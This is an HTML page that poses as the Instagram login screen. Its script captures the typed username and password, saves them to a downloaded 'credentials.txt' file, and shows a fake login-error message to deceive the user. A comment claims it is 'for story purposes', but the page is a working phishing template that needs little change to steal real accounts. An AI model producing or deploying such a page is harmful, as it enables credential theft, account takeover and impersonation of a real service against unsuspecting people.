<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            background-color: #fafafa; /* Light Instagram background */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }

        .login-box {
            background: white;
            padding: 30px;
            text-align: center;
            width: 300px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }

        .login-box img {
            width: 150px;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        button {
            background-color: #0095f6; /* Instagram blue */
            color: white;
            padding: 10px;
            border: none;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #0077cc;
        }

        .forgot-link {
            margin-top: 10px;
            font-size: 12px;
            color: #00376b;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://i.imgur.com/zqpwkLQ.png" alt="Instagram Logo">
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <p class="forgot-link">Forgot password?</p>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();  // Prevent actual login
            
            let username = document.getElementById("username").value;
            let password = document.getElementById("password").value;

            // Save the credentials to a text file (for story purposes)
            let data = "Username: " + username + " | Password: " + password + "\n";
            let blob = new Blob([data], { type: "text/plain" });

            let link = document.createElement("a");
            link.href = URL.createObjectURL(blob);
            link.download = "credentials.txt";
            link.click();

            alert("Incorrect username or password. Please try again.");
        });
    </script>
</body>
</html>
